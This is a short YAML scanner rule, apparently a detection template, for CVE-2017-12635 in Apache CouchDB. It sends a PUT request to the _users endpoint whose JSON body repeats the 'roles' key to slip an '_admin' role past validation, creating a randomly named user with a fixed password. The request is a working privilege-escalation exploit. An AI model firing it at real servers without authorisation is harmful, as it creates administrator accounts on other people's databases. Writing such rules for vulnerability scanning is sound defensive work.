cve-id: CVE-2017-12635
set:
  r1: randomLowercase(32)
rules:
  - method: PUT
    path: '/_users/org.couchdb.user:{{r1}}'
    headers:
      Content-Type: application/json
      Content-Length: '192'
    body: |-
      {
        "type": "user",
        "name": "{{r1}}",
        "roles": ["_admin"],
        "roles": [],
        "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
      }
    follow_redirects: false
    expression: |
      response.status == 201 && response.body.bcontains(b"org.couchdb.user:{{r1}}")
severity:
  critical
type: 
  privilegeescalation
